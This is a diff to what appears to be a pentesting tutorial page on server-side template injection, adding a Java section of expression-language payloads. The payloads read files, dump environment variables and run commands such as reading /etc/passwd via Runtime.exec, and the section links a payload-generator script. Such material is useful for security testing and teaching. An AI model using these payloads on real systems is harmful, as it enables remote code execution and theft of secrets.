@@ -557,6 +557,7 @@ ${7*7}
 #{7*7}
 %{7*7}
 {{7*7}}
+*{7*7}
 ...
 ```
 
@@ -858,6 +859,32 @@ Now let's create the payload:
 
 > ALL THE PYTHON PAYLOADS ARE BETWEEN DOUBLE `{}`
 {: .prompt-danger}
+
+## Java 
+
+Some payloads works for Java, like:
+```
+${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+```
+
+> If `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`
+{: .prompt-tip}
+
+With that case we can execute commands, as retrieving system's environment variables:
+```
+${T(java.lang.System).getenv()}
+```
+
+Or executing commands:
+```
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+```
+
+We can use [this](https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py) script to generate payload for this vulnerability.
 
 ---
 
